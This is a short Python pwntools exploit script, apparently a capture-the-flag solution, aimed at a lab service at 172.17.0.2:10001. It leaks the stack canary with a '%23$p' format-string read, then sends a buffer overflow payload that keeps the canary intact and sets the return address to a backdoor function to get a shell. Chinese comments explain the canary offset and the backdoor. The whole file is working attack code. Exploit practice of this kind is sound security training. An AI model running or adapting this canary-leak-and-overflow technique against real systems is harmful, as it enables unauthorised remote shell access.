#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

io = remote('172.17.0.2', 10001)

system_binsh_addr = 0x4008DA

io.recv()
io.sendline('2')
io.send('%23$p')							#canary的偏移，由于整个程序的canary都是一样的，所以可以这里泄露canary栈溢出使用。注意64位的格式化字符串溢出需要考虑到前6个参数使用寄存器传递
canary = int(io.recvuntil("1.")[:-2], 16)

payload = ""
payload += 'A'*136
payload += p64(canary)
payload += p64(0)
payload += p64(system_binsh_addr)		#程序留了后门，直接使用后门开shell
io.sendline('1')
io.send(payload)
io.interactive()